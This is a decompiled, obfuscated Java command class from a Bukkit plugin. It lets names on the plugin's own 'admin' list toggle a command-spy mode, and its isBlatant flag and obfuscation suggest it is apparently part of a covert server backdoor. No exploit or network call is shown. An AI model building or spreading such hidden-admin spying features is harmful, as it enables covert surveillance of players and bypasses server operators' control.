/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SpyCommand
extends Command {
    public SpyCommand() {
        SpyCommand lllllllllllllllIlIlIIllIIIIIIllI;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lllllllllllllllIlIlIIlIllllllllI, String lllllllllllllllIlIlIIllIIIIIIIIl, String[] lllllllllllllllIlIlIIllIIIIIIIII, Player lllllllllllllllIlIlIIlIlllllllll) {
        if (lllllllllllllllIlIlIIlIllllllllI.admin.contains(lllllllllllllllIlIlIIlIlllllllll.getName())) {
            if (lllllllllllllllIlIlIIlIllllllllI.cmdSpy.contains(lllllllllllllllIlIlIIlIlllllllll.getName())) {
                lllllllllllllllIlIlIIlIllllllllI.cmdSpy.remove(lllllllllllllllIlIlIIlIlllllllll.getName());
                lllllllllllllllIlIlIIlIlllllllll.sendMessage(Settings.PREFIX("Spy is now turned off"));
            } else {
                lllllllllllllllIlIlIIlIllllllllI.cmdSpy.add(lllllllllllllllIlIlIIlIlllllllll.getName());
                lllllllllllllllIlIlIIlIlllllllll.sendMessage(Settings.PREFIX("Spy is now turned on"));
            }
        } else {
            lllllllllllllllIlIlIIlIlllllllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("admin ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

